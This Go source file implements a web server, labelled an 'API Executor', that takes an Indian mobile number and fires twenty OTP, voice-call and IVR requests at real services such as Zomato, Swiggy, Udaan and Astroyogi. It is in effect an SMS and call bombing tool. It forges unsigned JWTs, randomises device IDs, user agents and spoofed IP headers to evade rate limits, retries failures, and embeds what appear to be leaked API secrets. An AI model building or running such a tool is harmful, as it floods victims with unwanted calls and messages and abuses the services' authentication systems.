package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// ========================
// Structures
// ========================
type API struct {
	Name    string
	URL     string
	Method  string
	Headers map[string]string
	Body    string
}

type APIResult struct {
	Name       string   `json:"name"`
	StatusCode int      `json:"status_code"`
	Response   string   `json:"response"`
	Error      string   `json:"error,omitempty"`
	Attempts   []string `json:"attempts"`
}

type ExecutorResponse struct {
	Success    bool        `json:"success"`
	Mobile     string      `json:"mobile"`
	TotalAPIs  int         `json:"total_apis"`
	SuccessAPI int         `json:"success_apis"`
	Results    []APIResult `json:"results"`
	Timestamp  string      `json:"timestamp"`
}

// ========================
// Helper Functions
// ========================
func base64urlEncode(str string) string {
	s := base64.StdEncoding.EncodeToString([]byte(str))
	s = strings.ReplaceAll(s, "+", "-")
	s = strings.ReplaceAll(s, "/", "_")
	s = strings.TrimRight(s, "=")
	return s
}

func generateUUID() string {
	return fmt.Sprintf("%04x%04x-%04x-%04x-%04x-%04x%04x%04x",
		rand.Intn(0xffff), rand.Intn(0xffff),
		rand.Intn(0xffff),
		rand.Intn(0x0fff)|0x4000,
		rand.Intn(0x3fff)|0x8000,
		rand.Intn(0xffff), rand.Intn(0xffff), rand.Intn(0xffff))
}

func randomAndroidId() string {
	out := ""
	for i := 0; i < 8; i++ {
		out += fmt.Sprintf("%04x", rand.Intn(0xffff))
	}
	return out
}

func randomDeviceId() string { return randomAndroidId() }

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(255)+1, rand.Intn(256), rand.Intn(256), rand.Intn(255)+1)
}

func randomUserAgent() string {
	android := []string{"9", "10", "11", "12", "13", "14"}[rand.Intn(6)]
	chrome := []string{"120", "121", "122", "123", "124", "125", "126", "127", "128", "129", "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "140", "141", "142", "143", "144", "145", "146", "147", "148"}[rand.Intn(29)]
	models := []string{"RMX3081", "SM-G998B", "Pixel 6", "OnePlus 9", "SM-A528B", "M2012K11AG", "SM-N986B", "Redmi Note 10", "SM-G991B", "Pixel 5"}
	model := models[rand.Intn(len(models))]
	builds := []string{"RKQ1.211119.001", "SP1A.210812.016", "TP1A.220624.014", "TQ3A.230901.001"}
	build := builds[rand.Intn(len(builds))]
	return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s Build/%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s.0.0.0 Mobile Safari/537.36", android, model, build, chrome)
}

func randomOkhttp() string {
	return fmt.Sprintf("okhttp/%d.%d.%d", rand.Intn(2)+3, rand.Intn(10), rand.Intn(10))
}

func generateAstroyogiToken() string {
	header := `{"alg":"none","typ":"JWT"}`
	now := time.Now().Unix()
	payload := fmt.Sprintf(`{"UserType":"TtaAppUser","EntityId":"29426901","SourceUserType":"TtaAppUser","SourceEntityId":"29426901","nbf":%d,"exp":%d}`, now, now+7776000)
	return base64urlEncode(header) + "." + base64urlEncode(payload) + "."
}

func generateAstroyogiWebToken() string {
	header := `{"alg":"none","typ":"JWT"}`
	now := time.Now().Unix()
	payload := fmt.Sprintf(`{"UserType":"WebUser","EntityId":"0","SourceUserType":"","SourceEntityId":"","nbf":%d,"exp":%d}`, now, now+7776000)
	return base64urlEncode(header) + "." + base64urlEncode(payload) + "."
}

// ========================
// Call API with Retry
// ========================
func callAPI(api API, maxRetries int) APIResult {
	result := APIResult{Name: api.Name, Attempts: []string{}}

	for i := 0; i < maxRetries; i++ {
		req, err := http.NewRequest(api.Method, api.URL, bytes.NewBufferString(api.Body))
		if err != nil {
			result.Error = err.Error()
			return result
		}
		for k, v := range api.Headers {
			req.Header.Set(k, v)
		}

		client := &http.Client{Timeout: 30 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			result.Error = err.Error()
			result.Attempts = append(result.Attempts, fmt.Sprintf("Attempt %d: Error", i+1))
			if i < maxRetries-1 {
				time.Sleep(time.Duration(500*(i+1)) * time.Millisecond)
			}
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		result.StatusCode = resp.StatusCode
		result.Response = string(body)
		result.Attempts = append(result.Attempts, fmt.Sprintf("Attempt %d: HTTP %d", i+1, resp.StatusCode))

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			return result
		}
		if resp.StatusCode >= 400 && resp.StatusCode < 500 && resp.StatusCode != 429 {
			return result
		}
		if i < maxRetries-1 {
			time.Sleep(time.Duration(500*(i+1)) * time.Millisecond)
		}
	}
	return result
}

// ========================
// Get All 20 APIs
// ========================
func getAPIs(mobile string) []API {
	clean := strings.Map(func(r rune) rune {
		if r >= '0' && r <= '9' {
			return r
		}
		return -1
	}, mobile)

	apis := []API{}

	// ---------- 1: Astroyogi GenerateOtpV3 ----------
	form1 := url.Values{}
	form1.Set("MobileNumber", clean)
	form1.Set("PhonCode", "91")
	form1.Set("CountryCode", "IN")
	form1.Set("Plateform", "Android")
	form1.Set("IsResend", "false")
	form1.Set("PhoneDeviceId", randomDeviceId())
	apis = append(apis, API{
		Name:   "Astroyogi GenerateOtpV3",
		URL:    "https://chapp.astroyogi.com/api/UserAccountV3/GenerateOtpV3",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/x-www-form-urlencoded",
			"authorization":   "Bearer " + generateAstroyogiToken(),
			"User-Agent":      randomUserAgent(),
			"X-Forwarded-For": randomIP(),
		},
		Body: form1.Encode(),
	})

	// ---------- 2: Astroyogi Voice ----------
	body2, _ := json.Marshal(map[string]interface{}{
		"countryCode":    "IN",
		"mobileNumber":   clean,
		"phoneCode":      "91",
		"phoneDeviceId":  randomDeviceId(),
		"platform":       "Android",
		"requestType":    "call",
	})
	apis = append(apis, API{
		Name:   "Astroyogi SendOtp (Voice)",
		URL:    "https://comm.astroyogi.com/api/OtpComm/SendOtp",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json",
			"authorization":   "Bearer " + generateAstroyogiToken(),
			"User-Agent":      randomUserAgent(),
			"X-Forwarded-For": randomIP(),
		},
		Body: string(body2),
	})

	// ---------- 3: Astroyogi Web ----------
	body3, _ := json.Marshal(map[string]interface{}{
		"phoneCode":            "91",
		"countryCode":          "IN",
		"mobileNumber":         clean,
		"platform":             "Web",
		"IpAddress":            randomIP(),
		"requestType":          "call",
		"countryCodeByHeader":  "IN",
	})
	apis = append(apis, API{
		Name:   "Astroyogi SendOtp (Web)",
		URL:    "https://comm.astroyogi.com/api/OtpComm/SendOtp",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json",
			"authorization":   "Bearer " + generateAstroyogiWebToken(),
			"User-Agent":      randomUserAgent(),
			"X-Forwarded-For": randomIP(),
		},
		Body: string(body3),
	})

	// ---------- 4: Zomato SMS ----------
	form4 := url.Values{}
	form4.Set("number", clean)
	form4.Set("country_id", "1")
	form4.Set("lc", "26fd3c9af2914791b566f84867425876")
	form4.Set("type", "initiate")
	form4.Set("verification_type", "sms")
	form4.Set("package_name", "com.application.zomato")
	form4.Set("message_uuid", "")
	apis = append(apis, API{
		Name:   "Zomato SMS Verification",
		URL:    "https://accounts.zomato.com/login/phone",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/x-www-form-urlencoded",
			"X-Forwarded-For": randomIP(),
		},
		Body: form4.Encode(),
	})

	// ---------- 5: Zomato Call ----------
	form5 := url.Values{}
	form5.Set("number", clean)
	form5.Set("country_id", "1")
	form5.Set("lc", "26fd3c9af2914791b566f84867425876")
	form5.Set("type", "initiate")
	form5.Set("verification_type", "call")
	form5.Set("package_name", "")
	form5.Set("message_uuid", "sms-service-v2-"+generateUUID())
	apis = append(apis, API{
		Name:   "Zomato Call Verification",
		URL:    "https://accounts.zomato.com/login/phone",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/x-www-form-urlencoded",
			"X-Forwarded-For": randomIP(),
		},
		Body: form5.Encode(),
	})

	// ---------- 6: Udaan WhatsApp ----------
	form6 := url.Values{}
	form6.Set("mobile", clean)
	apis = append(apis, API{
		Name:   "Udaan - WhatsApp OTP",
		URL:    "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/x-www-form-urlencoded;charset=UTF-8",
			"X-Forwarded-For": randomIP(),
		},
		Body: form6.Encode(),
	})

	// ---------- 7: Udaan Call ----------
	form7 := url.Values{}
	form7.Set("mobile", clean)
	apis = append(apis, API{
		Name:   "Udaan - Call OTP",
		URL:    "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&getOTPCall=true&whatsappConsent=false",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/x-www-form-urlencoded;charset=UTF-8",
			"X-Forwarded-For": randomIP(),
		},
		Body: form7.Encode(),
	})

	// ---------- 8: Clovia ----------
	body8, _ := json.Marshal(map[string]interface{}{
		"phone": clean, "is_signup": "true", "email": "", "otp": "",
	})
	apis = append(apis, API{
		Name:   "Clovia - OTP on Call",
		URL:    "https://www.clovia.com/api/v4/users/send-otp-on-call/",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json",
			"secretkey":       "_fxv&8)36e@kb8na3nj@azl@hzdkfmpaf)lf0+!kt4tu!=feea",
			"apikey":          "u(ihlye!wv)d6zpiyp@qxyqwlt)86#o%v^t%@ki-i@bm+18x7g",
			"User-Agent":      randomUserAgent(),
			"X-Forwarded-For": randomIP(),
		},
		Body: string(body8),
	})

	// ---------- 9: Swiggy ----------
	body9, _ := json.Marshal(map[string]string{"mobile": clean})
	apis = append(apis, API{
		Name:   "Swiggy - Call Verification",
		URL:    "https://profile.swiggy.com/api/v3/app/request_call_verification",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json",
			"User-Agent":      "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
			"X-Forwarded-For": "192.168.1.100",
		},
		Body: string(body9),
	})

	// ---------- 10: IndiaLends ----------
	form10 := url.Values{}
	form10.Set("MobileNumber", clean)
	form10.Set("Mode", "2")
	apis = append(apis, API{
		Name:   "IndiaLends - Resend OTP",
		URL:    "https://indialends.com/pl/SP_MVResend",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":        "application/x-www-form-urlencoded; charset=UTF-8",
			"sec-ch-ua-platform":  `"Android"`,
			"x-requested-with":    "XMLHttpRequest",
			"user-agent":          "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
			"accept":              "*/*",
			"sec-ch-ua":           `"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
			"sec-ch-ua-mobile":    "?1",
			"origin":              "https://indialends.com",
			"sec-fetch-site":      "same-origin",
			"sec-fetch-mode":      "cors",
			"sec-fetch-dest":      "empty",
			"referer":             "https://indialends.com/personal-loan",
			"accept-encoding":     "gzip, deflate, br, zstd",
			"accept-language":     "en-GB,en-US;q=0.9,en;q=0.8",
			"priority":            "u=1, i",
		},
		Body: form10.Encode(),
	})

	// ---------- 11: PenPencil ----------
	body11, _ := json.Marshal(map[string]string{
		"organizationId": "5eb393ee95fab7468a79d189",
		"mobile":         clean,
	})
	apis = append(apis, API{
		Name:   "PenPencil - Resend OTP",
		URL:    "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json",
			"user-agent":      "okhttp/3.9.1",
			"accept":          "*/*",
			"accept-encoding": "gzip, deflate, br",
		},
		Body: string(body11),
	})

	// ---------- 12: Happi ----------
	body12, _ := json.Marshal(map[string]string{"phone": clean})
	apis = append(apis, API{
		Name:   "Happi Mobiles - Login",
		URL:    "https://dev-services.happimobiles.com/api/user-login/homepage",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json",
			"User-Agent":      "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
			"X-Forwarded-For": "192.168.1.100",
		},
		Body: string(body12),
	})

	// ---------- 13: Smartcoin ----------
	body13, _ := json.Marshal(map[string]interface{}{
		"phone_number":       clean,
		"app_version":        fmt.Sprintf("100%d", rand.Intn(100)+100),
		"channel":            "IVR",
		"request_type":       "REGISTRATION",
		"onboarding_consent": true,
	})
	apis = append(apis, API{
		Name:   "Smartcoin - OTP Request",
		URL:    "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json",
			"X-Forwarded-For": randomIP(),
		},
		Body: string(body13),
	})

	// ---------- 14: HeyoPhone ----------
	body14, _ := json.Marshal(map[string]string{
		"country_code": "+91", "number": clean, "via": "call",
	})
	apis = append(apis, API{
		Name:   "HeyoPhone - Voice OTP",
		URL:    "https://api.heyophone.com/heyo/v1/otp/send",
		Method: "POST",
		Headers: map[string]string{
			"User-Agent":        "okhttp/4.12.0",
			"Accept":            "application/json, text/plain, */*",
			"Accept-Encoding":   "gzip",
			"Content-Type":      "application/json",
			"x-requested-with":  "XMLHttpRequest",
			"x-device-id":       "f461d071a6b39dff",
			"x-device-type":     "android",
		},
		Body: string(body14),
	})

	// ---------- 15: Dreamplug ----------
	body15, _ := json.Marshal(map[string]string{
		"channel": "voice",
		"phone":   "+91" + clean,
	})
	apis = append(apis, API{
		Name:   "Dreamplug - Resend OTP",
		URL:    "https://app-prod.dreamplug.in/otp/v2/resend",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":       "application/json; charset=UTF-8",
			"x-request-id":       generateUUID(),
			"x-transaction-id":   generateUUID(),
			"x-session-id":       generateUUID(),
			"x-installation-id":  generateUUID(),
			"x-device-id":        generateUUID(),
			"x-application-id":   generateUUID(),
			"x-os":               "android",
			"x-os-version":       fmt.Sprintf("%d", rand.Intn(6)+9),
			"x-os-api-level":     fmt.Sprintf("%d", rand.Intn(7)+28),
			"x-app-version":      "4.8.5.4",
			"x-app-version-code": "40805004",
			"user-agent":         randomOkhttp(),
			"X-Forwarded-For":    randomIP(),
		},
		Body: string(body15),
	})

	// ---------- 16: Magicpin Send ----------
	body16, _ := json.Marshal(map[string]interface{}{
		"phone_no":         "91" + clean,
		"sms_service_flag": "0",
		"app-version-name": fmt.Sprintf("1.%d.%d", rand.Intn(100)+100, rand.Intn(10)),
		"app-version":      rand.Intn(1000) + 1000,
	})
	apis = append(apis, API{
		Name:   "Magicpin - Send OTP V2",
		URL:    "https://auth.magicpin.in/SendOtp/V2/",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json; charset=UTF-8",
			"User-Agent":      randomOkhttp(),
			"package-name":    "com.magicpin.local",
			"X-Forwarded-For": randomIP(),
		},
		Body: string(body16),
	})

	// ---------- 17: Magicpin Call ----------
	body17, _ := json.Marshal(map[string]interface{}{
		"phone_no":         "91" + clean,
		"app-version-name": fmt.Sprintf("1.%d.%d", rand.Intn(100)+100, rand.Intn(10)),
		"app-version":      rand.Intn(1000) + 1000,
	})
	apis = append(apis, API{
		Name:   "Magicpin - Send OTP Call",
		URL:    "https://auth.magicpin.in/SendOtpByCall/",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json; charset=UTF-8",
			"User-Agent":      randomOkhttp(),
			"package-name":    "com.magicpin.local",
			"X-Forwarded-For": randomIP(),
		},
		Body: string(body17),
	})

	// ---------- 18: Nikita ----------
	body18, _ := json.Marshal(map[string]string{
		"endpoint":    "comm",
		"phoneNumber": clean,
		"countryCode": "IN",
		"phoneCode":   "91",
	})
	apis = append(apis, API{
		Name:   "Nikita Worker - OTP Relay",
		URL:    "https://test-api.nikita973280.workers.dev",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json",
			"User-Agent":      randomUserAgent(),
			"X-Forwarded-For": randomIP(),
		},
		Body: string(body18),
	})

	// ---------- 19: FreeNow ----------
	rawIncognia := fmt.Sprintf("%06d%06d%06d%06d%06d",
		rand.Intn(900000)+100000, rand.Intn(900000)+100000,
		rand.Intn(900000)+100000, rand.Intn(900000)+100000,
		rand.Intn(900000)+100000,
	)
	body19, _ := json.Marshal(map[string]string{
		"deviceId":      generateUUID(),
		"phoneAreaCode": "+91",
		"phoneNumber":   clean,
		"type":          "VOICE_CALL",
	})
	apis = append(apis, API{
		Name:   "FreeNow - Voice Call",
		URL:    "https://api.live.free-now.com/signupwithphoneservice/v3/passenger/challenge",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":             "application/json",
			"user-agent":               fmt.Sprintf("mytaxi_passenger/13.%d.0_%d ANDROID/%d (RMX3081)", rand.Intn(20)+40, rand.Intn(100)+2800, rand.Intn(4)+11),
			"incognia-installation-id": base64.StdEncoding.EncodeToString([]byte(rawIncognia)),
			"session-id":               generateUUID(),
			"x-myt-request-id":         generateUUID(),
			"X-Forwarded-For":          randomIP(),
		},
		Body: string(body19),
	})

	// ---------- 20: Chaayos ----------
	body20, _ := json.Marshal(map[string]string{"mobileNumber": clean})
	apis = append(apis, API{
		Name:   "Chaayos - IVR Call",
		URL:    "https://dine.chaayos.com/app-crm/v2/crm/v/r2-ivr/1000",
		Method: "POST",
		Headers: map[string]string{
			"Content-Type":    "application/json",
			"X-Forwarded-For": randomIP(),
		},
		Body: string(body20),
	})

	return apis
}

// ========================
// Handlers
// ========================
func homeHandler(w http.ResponseWriter, r *http.Request) {
	html := `<!DOCTYPE html>
<html><head><title>API Executor - 20 APIs</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;max-width:900px;margin:20px auto;padding:20px;background:#f5f5f5}
h1{color:#333}
input{padding:12px;width:250px;border:2px solid #ddd;border-radius:5px;font-size:16px}
button{padding:12px 30px;background:#007bff;color:#fff;border:none;border-radius:5px;font-size:16px;cursor:pointer;margin-left:10px}
button:hover{background:#0056b3}
form{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 5px rgba(0,0,0,0.1)}
.info{background:#e8f4fd;padding:15px;border-radius:5px;margin:20px 0}
</style></head><body>
<h1>🚀 API Executor - 20 APIs</h1>
<div class="info">
<strong>Features:</strong>
<ul>
<li>20 APIs executed sequentially</li>
<li>Fresh JWT tokens (Astroyogi)</li>
<li>Random device IDs & fingerprints</li>
<li>Random User-Agent per request</li>
<li>Random IP (X-Forwarded-For)</li>
<li>Auto-retry on failure</li>
</ul>
</div>
<form method="get" action="/execute">
<label><strong>Enter Mobile Number:</strong></label><br><br>
<input type="text" name="mobile" placeholder="Enter 10 digit" maxlength="10" required>
<button type="submit">Submit</button>
</form></body></html>`
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(html))
}

func executeHandler(w http.ResponseWriter, r *http.Request) {
	mobile := strings.TrimSpace(r.URL.Query().Get("mobile"))
	w.Header().Set("Content-Type", "application/json")

	clean := strings.Map(func(r rune) rune {
		if r >= '0' && r <= '9' {
			return r
		}
		return -1
	}, mobile)

	if len(clean) != 10 {
		json.NewEncoder(w).Encode(map[string]string{"error": "Enter valid 10-digit mobile"})
		return
	}

	apis := getAPIs(clean)
	results := []APIResult{}
	success := 0

	for _, api := range apis {
		res := callAPI(api, 2)
		results = append(results, res)
		if res.StatusCode >= 200 && res.StatusCode < 300 {
			success++
		}
		time.Sleep(200 * time.Millisecond)
	}

	json.NewEncoder(w).Encode(ExecutorResponse{
		Success:    true,
		Mobile:     mobile,
		TotalAPIs:  len(apis),
		SuccessAPI: success,
		Results:    results,
		Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
	})
}

// ========================
// Main
// ========================
func main() {
	rand.Seed(time.Now().UnixNano())

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	http.HandleFunc("/", homeHandler)
	http.HandleFunc("/execute", executeHandler)

	fmt.Printf("🚀 Server running on port %s\n", port)
	fmt.Printf("🌐 http://localhost:%s\n", port)
	fmt.Printf("📱 http://localhost:%s/execute?mobile=9685198958\n", port)
	http.ListenAndServe(":"+port, nil)
}
